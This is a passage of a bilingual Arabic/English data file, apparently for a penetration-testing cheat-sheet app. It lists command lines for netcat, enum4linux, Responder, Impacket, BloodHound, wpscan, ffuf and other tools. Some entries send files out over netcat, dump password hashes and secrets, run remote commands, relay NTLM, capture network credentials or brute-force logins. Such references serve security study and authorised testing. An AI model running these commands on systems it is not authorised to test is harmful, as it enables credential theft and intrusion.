      { command: "nc -lvnp 4444 2>&1 | tee capture.txt", description: { ar: "تسجيل الاتصال", en: "Log connection" } },
      { command: "nc -x proxy:8080 target.com 80", description: { ar: "الاتصال عبر بروكسي", en: "Connect via proxy" } },
      { command: "nc -C target.com 25", description: { ar: "اتصال SMTP", en: "SMTP connection" } },
      { command: "while true; do nc -lvnp 4444; done", description: { ar: "استماع متكرر", en: "Repeated listen" } },
      { command: "nc -s 192.168.1.100 192.168.1.1 4444", description: { ar: "تحديد IP المصدر", en: "Specify source IP" } },
      { command: "nc -l 4444 | tar xvf -", description: { ar: "استقبال وفك ضغط", en: "Receive and extract" } },
      { command: "tar cf - . | nc 192.168.1.1 4444", description: { ar: "ضغط وإرسال", en: "Compress and send" } },
    ],
  },
  {
    name: "Enum4linux",
    description: { ar: "أداة استطلاع Windows/Samba", en: "Windows/Samba enumeration tool" },
    commands: [
      { command: "enum4linux -a 192.168.1.1", description: { ar: "استطلاع شامل", en: "Full enumeration" } },
      { command: "enum4linux -U 192.168.1.1", description: { ar: "استخراج المستخدمين", en: "Extract users" } },
      { command: "enum4linux -S 192.168.1.1", description: { ar: "استخراج المشاركات", en: "Extract shares" } },
      { command: "enum4linux -G 192.168.1.1", description: { ar: "استخراج المجموعات", en: "Extract groups" } },
      { command: "enum4linux -P 192.168.1.1", description: { ar: "سياسة كلمات المرور", en: "Password policy" } },
      { command: "enum4linux -o 192.168.1.1", description: { ar: "معلومات نظام التشغيل", en: "OS info" } },
      { command: "enum4linux -n 192.168.1.1", description: { ar: "جدول أسماء NetBIOS", en: "NetBIOS name table" } },
      { command: "enum4linux -M 192.168.1.1", description: { ar: "قائمة الأجهزة", en: "Machine list" } },
      { command: "enum4linux -r 192.168.1.1", description: { ar: "استخراج RID", en: "RID enumeration" } },
      { command: "enum4linux -u admin -p password 192.168.1.1", description: { ar: "استطلاع مع صلاحيات", en: "Authenticated enum" } },
      { command: "enum4linux -R 1000-2000 192.168.1.1", description: { ar: "نطاق RID مخصص", en: "Custom RID range" } },
      { command: "enum4linux -d 192.168.1.1", description: { ar: "تفاصيل إضافية", en: "Extra details" } },
      { command: "enum4linux -K 192.168.1.1", description: { ar: "استخدام Kerberos", en: "Use Kerberos" } },
      { command: "enum4linux -w DOMAIN 192.168.1.1", description: { ar: "تحديد الدومين", en: "Specify domain" } },
      { command: "enum4linux -l 192.168.1.1", description: { ar: "معلومات LDAP", en: "LDAP info" } },
      { command: "enum4linux -A 192.168.1.1", description: { ar: "استطلاع عدواني", en: "Aggressive enum" } },
      { command: "enum4linux -v 192.168.1.1", description: { ar: "وضع مفصل", en: "Verbose mode" } },
      { command: "enum4linux -s shares.txt 192.168.1.1", description: { ar: "فحص من قائمة", en: "Scan from list" } },
      { command: "enum4linux -I 192.168.1.1", description: { ar: "معلومات الطابعات", en: "Printer info" } },
      { command: "enum4linux -C 192.168.1.1", description: { ar: "تعليقات المشاركات", en: "Share comments" } },
    ],
  },
  {
    name: "Dirb",
    description: { ar: "أداة اكتشاف محتوى الويب", en: "Web content discovery tool" },
    commands: [
      { command: "dirb http://target.com", description: { ar: "فحص أساسي", en: "Basic scan" } },
      { command: "dirb http://target.com /usr/share/wordlists/dirb/big.txt", description: { ar: "قائمة كبيرة", en: "Big wordlist" } },
      { command: "dirb http://target.com -a 'Mozilla/5.0'", description: { ar: "تغيير User-Agent", en: "Custom User-Agent" } },
      { command: "dirb http://target.com -o output.txt", description: { ar: "حفظ النتائج", en: "Save results" } },
      { command: "dirb http://target.com -X .php,.html", description: { ar: "امتدادات محددة", en: "Specific extensions" } },
      { command: "dirb http://target.com -c 'PHPSESSID=abc123'", description: { ar: "استخدام كوكيز", en: "Use cookies" } },
      { command: "dirb http://target.com -u admin:password", description: { ar: "مصادقة HTTP", en: "HTTP auth" } },
      { command: "dirb http://target.com -p http://127.0.0.1:8080", description: { ar: "استخدام بروكسي", en: "Use proxy" } },
      { command: "dirb http://target.com -z 10", description: { ar: "تأخير 10 مللي ثانية", en: "10ms delay" } },
      { command: "dirb http://target.com -N 404", description: { ar: "تجاهل كود محدد", en: "Ignore specific code" } },
      { command: "dirb http://target.com -r", description: { ar: "عدم البحث العودي", en: "Non-recursive" } },
      { command: "dirb http://target.com -w", description: { ar: "تجاهل التحذيرات", en: "Ignore warnings" } },
      { command: "dirb http://target.com -S", description: { ar: "وضع صامت", en: "Silent mode" } },
      { command: "dirb http://target.com -f", description: { ar: "ضبط دقيق", en: "Fine tuning" } },
      { command: "dirb http://target.com -t", description: { ar: "عدم تفاعلي", en: "Non-interactive" } },
      { command: "dirb https://target.com", description: { ar: "فحص HTTPS", en: "HTTPS scan" } },
      { command: "dirb http://target.com:8080", description: { ar: "منفذ مخصص", en: "Custom port" } },
      { command: "dirb http://target.com -H 'X-Custom: value'", description: { ar: "رأس مخصص", en: "Custom header" } },
      { command: "dirb http://target.com -i", description: { ar: "بحث غير حساس للحالة", en: "Case insensitive" } },
      { command: "dirb http://target.com /usr/share/wordlists/common.txt -x extensions.txt", description: { ar: "ملف امتدادات", en: "Extensions file" } },
    ],
  },
  {
    name: "Wfuzz",
    description: { ar: "أداة Fuzzing لتطبيقات الويب", en: "Web application fuzzing tool" },
    commands: [
      { command: "wfuzz -c -z file,wordlist.txt http://target.com/FUZZ", description: { ar: "Fuzzing أساسي", en: "Basic fuzzing" } },
      { command: "wfuzz -c -z file,wordlist.txt --hc 404 http://target.com/FUZZ", description: { ar: "تجاهل 404", en: "Hide 404" } },
      { command: "wfuzz -c -z file,wordlist.txt -d 'user=admin&pass=FUZZ' http://target.com/login", description: { ar: "Fuzzing POST", en: "POST fuzzing" } },
      { command: "wfuzz -c -z range,1-100 http://target.com/page?id=FUZZ", description: { ar: "نطاق أرقام", en: "Number range" } },
      { command: "wfuzz -c -z file,wordlist.txt -H 'Cookie: session=FUZZ' http://target.com/", description: { ar: "Fuzzing الكوكيز", en: "Cookie fuzzing" } },
      { command: "wfuzz -c -z file,users.txt -z file,passwords.txt http://target.com/login?user=FUZ2Z&pass=FUZZ", description: { ar: "Fuzzing متعدد", en: "Multi fuzzing" } },
      { command: "wfuzz -c -z file,wordlist.txt --hl 0 http://target.com/FUZZ", description: { ar: "إخفاء ردود فارغة", en: "Hide empty responses" } },
      { command: "wfuzz -c -z file,wordlist.txt -b 'session=abc123' http://target.com/FUZZ", description: { ar: "استخدام كوكيز", en: "Use cookies" } },
      { command: "wfuzz -c -z file,wordlist.txt -p 127.0.0.1:8080 http://target.com/FUZZ", description: { ar: "استخدام بروكسي", en: "Use proxy" } },
      { command: "wfuzz -c -z file,wordlist.txt -t 50 http://target.com/FUZZ", description: { ar: "50 خيط", en: "50 threads" } },
      { command: "wfuzz -c -z file,wordlist.txt --sc 200 http://target.com/FUZZ", description: { ar: "عرض 200 فقط", en: "Show only 200" } },
      { command: "wfuzz -c -z file,wordlist.txt --sw 10 http://target.com/FUZZ", description: { ar: "عرض حسب عدد الكلمات", en: "Show by word count" } },
      { command: "wfuzz -c -z file,wordlist.txt -R 2 http://target.com/FUZZ", description: { ar: "عمق العودية 2", en: "Recursion depth 2" } },
      { command: "wfuzz -c -z file,wordlist.txt -L http://target.com/FUZZ", description: { ar: "تتبع إعادة التوجيه", en: "Follow redirects" } },
      { command: "wfuzz -c -z file,wordlist.txt --req-delay 1 http://target.com/FUZZ", description: { ar: "تأخير ثانية", en: "1 second delay" } },
      { command: "wfuzz -c -z file,wordlist.txt -o json http://target.com/FUZZ", description: { ar: "مخرجات JSON", en: "JSON output" } },
      { command: "wfuzz -e payloads", description: { ar: "عرض الحمولات المتاحة", en: "List payloads" } },
      { command: "wfuzz -c -z file,wordlist.txt --script=robots http://target.com/FUZZ", description: { ar: "استخدام سكربت", en: "Use script" } },
      { command: "wfuzz -c -z list,admin-config-backup http://target.com/FUZZ", description: { ar: "قائمة مباشرة", en: "Direct list" } },
      { command: "wfuzz -c -z file,wordlist.txt -f output.html,html http://target.com/FUZZ", description: { ar: "تقرير HTML", en: "HTML report" } },
    ],
  },
  {
    name: "theHarvester",
    description: { ar: "أداة جمع المعلومات والبريد الإلكتروني", en: "Email and info gathering tool" },
    commands: [
      { command: "theHarvester -d target.com -b google", description: { ar: "بحث Google", en: "Google search" } },
      { command: "theHarvester -d target.com -b all", description: { ar: "جميع المصادر", en: "All sources" } },
      { command: "theHarvester -d target.com -b linkedin", description: { ar: "بحث LinkedIn", en: "LinkedIn search" } },
      { command: "theHarvester -d target.com -b bing", description: { ar: "بحث Bing", en: "Bing search" } },
      { command: "theHarvester -d target.com -l 500", description: { ar: "500 نتيجة", en: "500 results" } },
      { command: "theHarvester -d target.com -b google -f report", description: { ar: "حفظ تقرير", en: "Save report" } },
      { command: "theHarvester -d target.com -b shodan", description: { ar: "بحث Shodan", en: "Shodan search" } },
      { command: "theHarvester -d target.com -b crtsh", description: { ar: "بحث الشهادات", en: "Certificate search" } },
      { command: "theHarvester -d target.com -b virustotal", description: { ar: "بحث VirusTotal", en: "VirusTotal search" } },
      { command: "theHarvester -d target.com -b hunter", description: { ar: "بحث Hunter.io", en: "Hunter.io search" } },
      { command: "theHarvester -d target.com -b dnsdumpster", description: { ar: "DNS Dumpster", en: "DNS Dumpster" } },
      { command: "theHarvester -d target.com -b github-code", description: { ar: "بحث GitHub", en: "GitHub search" } },
      { command: "theHarvester -d target.com -b yahoo", description: { ar: "بحث Yahoo", en: "Yahoo search" } },
      { command: "theHarvester -d target.com -b baidu", description: { ar: "بحث Baidu", en: "Baidu search" } },
      { command: "theHarvester -d target.com -n", description: { ar: "البحث عن DNS", en: "DNS lookup" } },
      { command: "theHarvester -d target.com -c", description: { ar: "البحث العميق", en: "Deep search" } },
      { command: "theHarvester -d target.com -v", description: { ar: "التحقق من المضيفين", en: "Verify hosts" } },
      { command: "theHarvester -d target.com -r", description: { ar: "البحث العكسي", en: "Reverse lookup" } },
      { command: "theHarvester -d target.com -s", description: { ar: "بداية النتائج", en: "Start result" } },
      { command: "theHarvester -d target.com -b google,bing,linkedin", description: { ar: "مصادر متعددة", en: "Multiple sources" } },
    ],
  },
  {
    name: "Maltego",
    description: { ar: "أداة تحليل الروابط والاستطلاع", en: "Link analysis and recon tool" },
    commands: [
      { command: "maltego", description: { ar: "تشغيل Maltego", en: "Start Maltego" } },
      { command: "New Graph → Add Entity", description: { ar: "إضافة كيان جديد", en: "Add new entity" } },
      { command: "Entity → Domain → Run All Transforms", description: { ar: "تشغيل جميع التحويلات", en: "Run all transforms" } },
      { command: "Entity → Person → To Email Addresses", description: { ar: "استخراج البريد", en: "Extract emails" } },
      { command: "Entity → Domain → To DNS Names", description: { ar: "أسماء DNS", en: "DNS names" } },
      { command: "Entity → IP → To Netblocks", description: { ar: "نطاقات الشبكة", en: "Netblocks" } },
      { command: "Entity → Email → To Person", description: { ar: "معلومات الشخص", en: "Person info" } },
      { command: "Entity → Phone Number → To Person", description: { ar: "ربط رقم بشخص", en: "Link phone to person" } },
      { command: "Entity → Website → To IP", description: { ar: "IP الموقع", en: "Website IP" } },
      { command: "Entity → Company → To Domains", description: { ar: "نطاقات الشركة", en: "Company domains" } },
      { command: "View → Graph Layout → Organic", description: { ar: "تخطيط عضوي", en: "Organic layout" } },
      { command: "View → Graph Layout → Hierarchical", description: { ar: "تخطيط هرمي", en: "Hierarchical layout" } },
      { command: "File → Export → As Image", description: { ar: "تصدير كصورة", en: "Export as image" } },
      { command: "File → Export → As Report", description: { ar: "تصدير كتقرير", en: "Export as report" } },
      { command: "Transform Hub → Install", description: { ar: "تثبيت تحويلات", en: "Install transforms" } },
      { command: "Settings → API Keys", description: { ar: "إعداد مفاتيح API", en: "Set API keys" } },
      { command: "Entity → Social Network → To Profile", description: { ar: "ملفات التواصل", en: "Social profiles" } },
      { command: "Entity → Hash → To Malware", description: { ar: "تحليل البرمجيات الخبيثة", en: "Malware analysis" } },
      { command: "Entity → Location → To GPS", description: { ar: "إحداثيات GPS", en: "GPS coordinates" } },
      { command: "File → New Machine", description: { ar: "آلة جديدة", en: "New machine" } },
    ],
  },
  {
    name: "Responder",
    description: { ar: "أداة التقاط كلمات المرور في الشبكة", en: "Network password capture tool" },
    commands: [
      { command: "responder -I eth0", description: { ar: "الاستماع على الواجهة", en: "Listen on interface" } },
      { command: "responder -I eth0 -wrf", description: { ar: "وضع متقدم", en: "Advanced mode" } },
      { command: "responder -I eth0 --lm", description: { ar: "التقاط LM", en: "Capture LM" } },
      { command: "responder -I eth0 -b", description: { ar: "تعطيل NBNS", en: "Disable NBNS" } },
      { command: "responder -I eth0 -r", description: { ar: "تحليل NetBIOS", en: "NetBIOS analysis" } },
      { command: "responder -I eth0 -d", description: { ar: "تحليل DHCP", en: "DHCP analysis" } },
      { command: "responder -I eth0 -w", description: { ar: "خادم WPAD", en: "WPAD server" } },
      { command: "responder -I eth0 -F", description: { ar: "فرض WPAD", en: "Force WPAD" } },
      { command: "responder -I eth0 -P", description: { ar: "بروكسي WPAD", en: "WPAD proxy" } },
      { command: "responder -I eth0 -v", description: { ar: "وضع مفصل", en: "Verbose mode" } },
      { command: "responder -I eth0 --disable-ess", description: { ar: "تعطيل ESS", en: "Disable ESS" } },
      { command: "responder -I eth0 -e IP", description: { ar: "IP خارجي", en: "External IP" } },
      { command: "cat /usr/share/responder/logs/*", description: { ar: "عرض السجلات", en: "View logs" } },
      { command: "responder --version", description: { ar: "عرض الإصدار", en: "Show version" } },
      { command: "responder -I eth0 -A", description: { ar: "وضع التحليل فقط", en: "Analyze only mode" } },
      { command: "hashcat -m 5600 hash.txt wordlist.txt", description: { ar: "كسر NTLMv2", en: "Crack NTLMv2" } },
      { command: "responder -I eth0 --basic", description: { ar: "مصادقة أساسية", en: "Basic auth" } },
      { command: "responder -I eth0 --wredir", description: { ar: "إعادة توجيه WPAD", en: "WPAD redirect" } },
      { command: "responder -I eth0 --lldp", description: { ar: "LLDP Spoofing", en: "LLDP Spoofing" } },
      { command: "responder -I eth0 -i IP", description: { ar: "IP محدد", en: "Specific IP" } },
    ],
  },
  {
    name: "Recon-ng",
    description: { ar: "إطار استطلاع متكامل لجمع المعلومات", en: "Full-featured web reconnaissance framework" },
    commands: [
      { command: "recon-ng", description: { ar: "تشغيل Recon-ng", en: "Start Recon-ng" } },
      { command: "marketplace search", description: { ar: "البحث عن الوحدات", en: "Search modules" } },
      { command: "marketplace install all", description: { ar: "تثبيت جميع الوحدات", en: "Install all modules" } },
      { command: "workspaces create test", description: { ar: "إنشاء مساحة عمل", en: "Create workspace" } },
      { command: "db insert domains", description: { ar: "إضافة نطاق", en: "Add domain" } },
      { command: "modules load recon/domains-hosts/hackertarget", description: { ar: "تحميل وحدة", en: "Load module" } },
      { command: "run", description: { ar: "تشغيل الوحدة", en: "Run module" } },
      { command: "show hosts", description: { ar: "عرض المضيفين", en: "Show hosts" } },
      { command: "show contacts", description: { ar: "عرض جهات الاتصال", en: "Show contacts" } },
      { command: "show credentials", description: { ar: "عرض البيانات", en: "Show credentials" } },
      { command: "keys add shodan_api KEY", description: { ar: "إضافة مفتاح API", en: "Add API key" } },
      { command: "options set SOURCE domain.com", description: { ar: "تعيين المصدر", en: "Set source" } },
      { command: "modules search whois", description: { ar: "بحث وحدات WHOIS", en: "Search WHOIS modules" } },
      { command: "db export csv /path/file.csv", description: { ar: "تصدير CSV", en: "Export CSV" } },
      { command: "spool start /path/output.txt", description: { ar: "تسجيل المخرجات", en: "Log output" } },
      { command: "modules load recon/netblocks-hosts/shodan_net", description: { ar: "وحدة Shodan", en: "Shodan module" } },
      { command: "show schema", description: { ar: "عرض المخطط", en: "Show schema" } },
      { command: "back", description: { ar: "الرجوع", en: "Go back" } },
      { command: "help", description: { ar: "المساعدة", en: "Help" } },
      { command: "exit", description: { ar: "الخروج", en: "Exit" } },
    ],
  },
  {
    name: "Sn1per",
    description: { ar: "أداة استطلاع آلية شاملة", en: "Automated reconnaissance scanner" },
    commands: [
      { command: "sniper -t target.com", description: { ar: "فحص أساسي", en: "Basic scan" } },
      { command: "sniper -t target.com -m stealth", description: { ar: "وضع خفي", en: "Stealth mode" } },
      { command: "sniper -t target.com -m web", description: { ar: "فحص الويب", en: "Web scan" } },
      { command: "sniper -t target.com -m webscan", description: { ar: "فحص تطبيقات الويب", en: "Webapp scan" } },
      { command: "sniper -t target.com -o -re", description: { ar: "مع تقرير", en: "With report" } },
      { command: "sniper -t target.com -m vulnscan", description: { ar: "فحص الثغرات", en: "Vulnerability scan" } },
      { command: "sniper -t target.com -m fullportonly", description: { ar: "جميع المنافذ", en: "Full port scan" } },
      { command: "sniper -t target.com -m bruteforce", description: { ar: "هجوم القوة الغاشمة", en: "Brute force" } },
      { command: "sniper -t target.com -b", description: { ar: "وضع الدفعات", en: "Batch mode" } },
      { command: "sniper -t target.com -m airstrike", description: { ar: "وضع Airstrike", en: "Airstrike mode" } },
      { command: "sniper -t target.com -fp", description: { ar: "جميع المنافذ + بصمات", en: "Full + fingerprints" } },
      { command: "sniper -t target.com -m nuke", description: { ar: "فحص شامل", en: "Nuke mode" } },
      { command: "sniper -t target.com -m discover", description: { ar: "وضع الاكتشاف", en: "Discover mode" } },
      { command: "sniper -t target.com --rerun", description: { ar: "إعادة الفحص", en: "Re-run scan" } },
      { command: "sniper -t target.com -w workspace", description: { ar: "مساحة عمل", en: "Workspace" } },
      { command: "sniper -u", description: { ar: "تحديث Sn1per", en: "Update Sn1per" } },
      { command: "sniper -t target.com -m massweb", description: { ar: "فحص ويب جماعي", en: "Mass web scan" } },
      { command: "sniper -t target.com -m massportscan", description: { ar: "فحص منافذ جماعي", en: "Mass port scan" } },
      { command: "sniper -t target.com --loot", description: { ar: "عرض النتائج", en: "Show loot" } },
      { command: "sniper -t target.com -m osint", description: { ar: "جمع OSINT", en: "OSINT gathering" } },
    ],
  },
  {
    name: "Wpscan",
    description: { ar: "أداة فحص أمان WordPress", en: "WordPress security scanner" },
    commands: [
      { command: "wpscan --url http://target.com", description: { ar: "فحص أساسي", en: "Basic scan" } },
      { command: "wpscan --url http://target.com --enumerate u", description: { ar: "استخراج المستخدمين", en: "Enumerate users" } },
      { command: "wpscan --url http://target.com --enumerate p", description: { ar: "استخراج الإضافات", en: "Enumerate plugins" } },
      { command: "wpscan --url http://target.com --enumerate t", description: { ar: "استخراج القوالب", en: "Enumerate themes" } },
      { command: "wpscan --url http://target.com --enumerate vp", description: { ar: "إضافات ضعيفة", en: "Vulnerable plugins" } },
      { command: "wpscan --url http://target.com -U users.txt -P pass.txt", description: { ar: "هجوم القوة الغاشمة", en: "Brute force" } },
      { command: "wpscan --url http://target.com --api-token TOKEN", description: { ar: "مع API Token", en: "With API token" } },
      { command: "wpscan --url http://target.com --plugins-detection aggressive", description: { ar: "اكتشاف عدواني", en: "Aggressive detection" } },
      { command: "wpscan --url http://target.com -o report.txt", description: { ar: "حفظ التقرير", en: "Save report" } },
      { command: "wpscan --url http://target.com --random-user-agent", description: { ar: "User-Agent عشوائي", en: "Random User-Agent" } },
      { command: "wpscan --url http://target.com --force", description: { ar: "تجاوز التحقق", en: "Force scan" } },
      { command: "wpscan --url http://target.com --stealthy", description: { ar: "وضع خفي", en: "Stealthy mode" } },
      { command: "wpscan --url http://target.com --wp-content-dir custom", description: { ar: "مسار مخصص", en: "Custom path" } },
      { command: "wpscan --url http://target.com --disable-tls-checks", description: { ar: "تجاهل SSL", en: "Disable TLS checks" } },
      { command: "wpscan --url http://target.com --proxy http://127.0.0.1:8080", description: { ar: "استخدام بروكسي", en: "Use proxy" } },
      { command: "wpscan --update", description: { ar: "تحديث قاعدة البيانات", en: "Update database" } },
      { command: "wpscan --url http://target.com --enumerate cb", description: { ar: "نسخ احتياطية", en: "Config backups" } },
      { command: "wpscan --url http://target.com --enumerate dbe", description: { ar: "تصدير قاعدة البيانات", en: "DB exports" } },
      { command: "wpscan --url http://target.com --password-attack wp-login", description: { ar: "هجوم صفحة الدخول", en: "Login page attack" } },
      { command: "wpscan --url http://target.com --max-threads 50", description: { ar: "50 خيط", en: "50 threads" } },
    ],
  },
  {
    name: "Ffuf",
    description: { ar: "أداة Fuzzing سريعة للويب", en: "Fast web fuzzer" },
    commands: [
      { command: "ffuf -u http://target.com/FUZZ -w wordlist.txt", description: { ar: "Fuzzing أساسي", en: "Basic fuzzing" } },
      { command: "ffuf -u http://target.com/FUZZ -w wordlist.txt -fc 404", description: { ar: "تجاهل 404", en: "Filter 404" } },
      { command: "ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200,301", description: { ar: "عرض 200,301 فقط", en: "Match 200,301 only" } },
      { command: "ffuf -u http://target.com/FUZZ -w wordlist.txt -e .php,.html", description: { ar: "امتدادات محددة", en: "Specific extensions" } },
      { command: "ffuf -u http://target.com/FUZZ -w wordlist.txt -t 100", description: { ar: "100 خيط", en: "100 threads" } },
      { command: "ffuf -u http://target.com/FUZZ -w wordlist.txt -o results.json", description: { ar: "حفظ JSON", en: "Save JSON" } },
      { command: "ffuf -u http://target.com/FUZZ -w wordlist.txt -H 'Cookie: session=abc'", description: { ar: "مع كوكيز", en: "With cookies" } },
      { command: "ffuf -u http://target.com/FUZZ -w wordlist.txt -recursion", description: { ar: "بحث عودي", en: "Recursive" } },
      { command: "ffuf -u http://target.com/FUZZ -w wordlist.txt -fs 0", description: { ar: "تجاهل حجم 0", en: "Filter size 0" } },
      { command: "ffuf -u http://target.com/FUZZ -w wordlist.txt -fw 10", description: { ar: "تجاهل 10 كلمات", en: "Filter 10 words" } },
      { command: "ffuf -u http://target.com/FUZZ -w wordlist.txt -fl 5", description: { ar: "تجاهل 5 أسطر", en: "Filter 5 lines" } },
      { command: "ffuf -u http://target.com/FUZZ -w wordlist.txt -x http://127.0.0.1:8080", description: { ar: "عبر بروكسي", en: "Via proxy" } },
      { command: "ffuf -u http://target.com/ -w wordlist.txt -H 'Host: FUZZ.target.com'", description: { ar: "Vhost Fuzzing", en: "Vhost fuzzing" } },
      { command: "ffuf -u http://target.com/api?id=FUZZ -w numbers.txt", description: { ar: "Fuzzing البارامترات", en: "Parameter fuzzing" } },
      { command: "ffuf -u http://target.com/FUZZ -w wordlist.txt -rate 100", description: { ar: "100 طلب/ثانية", en: "100 req/sec" } },
      { command: "ffuf -u http://target.com/FUZZ -w wordlist.txt -timeout 10", description: { ar: "وقت انتظار 10 ثواني", en: "10 sec timeout" } },
      { command: "ffuf -u http://target.com/FUZZ -w wordlist.txt -ac", description: { ar: "معايرة تلقائية", en: "Auto calibrate" } },
      { command: "ffuf -u http://target.com/login -X POST -d 'user=admin&pass=FUZZ' -w pass.txt", description: { ar: "POST Fuzzing", en: "POST fuzzing" } },
      { command: "ffuf -u http://target.com/FUZZ -w wordlist.txt -ic", description: { ar: "تجاهل التعليقات", en: "Ignore comments" } },
      { command: "ffuf -u http://target.com/FUZZ -w wordlist.txt -v", description: { ar: "وضع مفصل", en: "Verbose mode" } },
    ],
  },
  {
    name: "Impacket",
    description: { ar: "مجموعة أدوات Python لبروتوكولات الشبكة", en: "Python network protocol tools" },
    commands: [
      { command: "impacket-secretsdump domain/user:pass@IP", description: { ar: "استخراج الهاشات", en: "Dump secrets" } },
      { command: "impacket-psexec domain/user:pass@IP", description: { ar: "تنفيذ أوامر عن بعد", en: "Remote execution" } },
      { command: "impacket-wmiexec domain/user:pass@IP", description: { ar: "WMI Execution", en: "WMI execution" } },
      { command: "impacket-smbexec domain/user:pass@IP", description: { ar: "SMB Execution", en: "SMB execution" } },
      { command: "impacket-dcomexec domain/user:pass@IP", description: { ar: "DCOM Execution", en: "DCOM execution" } },
      { command: "impacket-GetNPUsers domain/ -usersfile users.txt -no-pass", description: { ar: "AS-REP Roasting", en: "AS-REP Roasting" } },
      { command: "impacket-GetUserSPNs domain/user:pass -request", description: { ar: "Kerberoasting", en: "Kerberoasting" } },
      { command: "impacket-smbclient //IP/share -U user", description: { ar: "عميل SMB", en: "SMB client" } },
      { command: "impacket-ntlmrelayx -t IP -smb2support", description: { ar: "NTLM Relay", en: "NTLM relay" } },
      { command: "impacket-lookupsid domain/user:pass@IP", description: { ar: "Lookup SID", en: "Lookup SID" } },
      { command: "impacket-GetADUsers domain/user:pass -all", description: { ar: "استخراج مستخدمي AD", en: "Get AD users" } },
      { command: "impacket-reg domain/user:pass@IP query -keyName HKLM\\\\SAM", description: { ar: "قراءة الريجستري", en: "Read registry" } },
      { command: "impacket-atexec domain/user:pass@IP 'command'", description: { ar: "تنفيذ عبر AT", en: "AT execution" } },
      { command: "impacket-ticketer -domain domain.local -spn cifs/dc.domain.local", description: { ar: "إنشاء تذكرة", en: "Create ticket" } },
      { command: "impacket-getTGT domain/user:pass", description: { ar: "الحصول على TGT", en: "Get TGT" } },
      { command: "impacket-getST domain/user:pass -spn cifs/target", description: { ar: "الحصول على ST", en: "Get ST" } },
      { command: "impacket-rpcdump IP", description: { ar: "RPC Dump", en: "RPC dump" } },
      { command: "impacket-samrdump domain/user:pass@IP", description: { ar: "SAM Dump", en: "SAM dump" } },
      { command: "impacket-services domain/user:pass@IP list", description: { ar: "قائمة الخدمات", en: "List services" } },
      { command: "impacket-mssqlclient domain/user:pass@IP -windows-auth", description: { ar: "عميل MSSQL", en: "MSSQL client" } },
    ],
  },
  {
    name: "BloodHound",
    description: { ar: "أداة تحليل Active Directory", en: "Active Directory analysis tool" },
    commands: [
      { command: "bloodhound-python -u user -p pass -d domain.local -c all", description: { ar: "جمع كل البيانات", en: "Collect all data" } },
      { command: "bloodhound-python -u user -p pass -d domain.local -ns IP", description: { ar: "تحديد DNS Server", en: "Specify DNS" } },
      { command: "neo4j console", description: { ar: "تشغيل Neo4j", en: "Start Neo4j" } },
      { command: "bloodhound", description: { ar: "تشغيل BloodHound GUI", en: "Start BloodHound GUI" } },
      { command: "Import → Upload Data", description: { ar: "استيراد البيانات", en: "Import data" } },
      { command: "Analysis → Find Shortest Path to Domain Admins", description: { ar: "أقصر مسار للـ DA", en: "Shortest path to DA" } },
      { command: "Analysis → Find All Domain Admins", description: { ar: "كل مدراء النطاق", en: "All Domain Admins" } },
      { command: "Analysis → Find Kerberoastable Users", description: { ar: "مستخدمين Kerberoastable", en: "Kerberoastable users" } },
      { command: "Analysis → Find AS-REP Roastable Users", description: { ar: "مستخدمين AS-REP", en: "AS-REP Roastable" } },
      { command: "Search → MATCH (n) RETURN n LIMIT 100", description: { ar: "استعلام Cypher", en: "Cypher query" } },
      { command: "Node Info → Outbound Control Rights", description: { ar: "صلاحيات الخروج", en: "Outbound rights" } },
      { command: "Node Info → Inbound Control Rights", description: { ar: "صلاحيات الدخول", en: "Inbound rights" } },
      { command: "Analysis → Find Computers with Unsupported OS", description: { ar: "أنظمة غير مدعومة", en: "Unsupported OS" } },
      { command: "Analysis → Find GPO Abuse", description: { ar: "استغلال GPO", en: "GPO abuse" } },
      { command: "Edge Info → Abuse Info", description: { ar: "معلومات الاستغلال", en: "Abuse info" } },
      { command: "Settings → Dark Mode", description: { ar: "الوضع المظلم", en: "Dark mode" } },
      { command: "Export → Export Graph", description: { ar: "تصدير الرسم", en: "Export graph" } },
      { command: "bloodhound-python --zip", description: { ar: "ضغط النتائج", en: "Zip results" } },
      { command: "Analysis → Find Principals with DCSync Rights", description: { ar: "صلاحيات DCSync", en: "DCSync rights" } },
      { command: "Analysis → Find High Value Targets", description: { ar: "أهداف عالية القيمة", en: "High value targets" } },
    ],
  },
  {
    name: "Amass",
    description: { ar: "أداة استطلاع DNS متقدمة", en: "Advanced DNS enumeration tool" },
    commands: [
      { command: "amass enum -d domain.com", description: { ar: "استطلاع أساسي", en: "Basic enumeration" } },
      { command: "amass enum -passive -d domain.com", description: { ar: "استطلاع سلبي فقط", en: "Passive only" } },
      { command: "amass enum -active -d domain.com", description: { ar: "استطلاع نشط", en: "Active enumeration" } },
      { command: "amass enum -brute -d domain.com", description: { ar: "Brute force DNS", en: "DNS brute force" } },
      { command: "amass intel -d domain.com", description: { ar: "جمع المعلومات", en: "Intelligence gathering" } },
      { command: "amass enum -d domain.com -o output.txt", description: { ar: "حفظ النتائج", en: "Save results" } },
      { command: "amass enum -d domain.com -src", description: { ar: "عرض المصادر", en: "Show sources" } },
      { command: "amass enum -d domain.com -ip", description: { ar: "عرض عناوين IP", en: "Show IPs" } },
      { command: "amass viz -d domain.com", description: { ar: "إنشاء رسم بياني", en: "Create visualization" } },
      { command: "amass enum -d domain.com -config config.ini", description: { ar: "استخدام ملف إعدادات", en: "Use config file" } },
      { command: "amass db -list", description: { ar: "قائمة قواعد البيانات", en: "List databases" } },
      { command: "amass db -d domain.com -show", description: { ar: "عرض البيانات المخزنة", en: "Show stored data" } },
      { command: "amass track -d domain.com", description: { ar: "تتبع التغييرات", en: "Track changes" } },
      { command: "amass enum -d domain.com -max-dns-queries 20000", description: { ar: "زيادة الاستعلامات", en: "Increase queries" } },
      { command: "amass enum -d domain.com -timeout 60", description: { ar: "وقت انتظار 60 ثانية", en: "60 sec timeout" } },
      { command: "amass enum -d domain.com -asn 1234", description: { ar: "استطلاع حسب ASN", en: "Enum by ASN" } },
      { command: "amass enum -d domain.com -cidr 192.168.1.0/24", description: { ar: "استطلاع CIDR", en: "CIDR enum" } },
      { command: "amass enum -d domain.com -include-unresolvable", description: { ar: "تضمين غير القابلة للحل", en: "Include unresolvable" } },
      { command: "amass enum -d domain.com -nf output.txt", description: { ar: "تصفية الأسماء", en: "Name filtering" } },
      { command: "amass enum -d domain.com -r 8.8.8.8", description: { ar: "استخدام DNS محدد", en: "Use specific DNS" } },
    ],
  },
  {
    name: "Nuclei",
    description: { ar: "ماسح ثغرات سريع بالقوالب", en: "Fast vulnerability scanner with templates" },
    commands: [
      { command: "nuclei -u https://target.com", description: { ar: "فحص هدف واحد", en: "Scan single target" } },
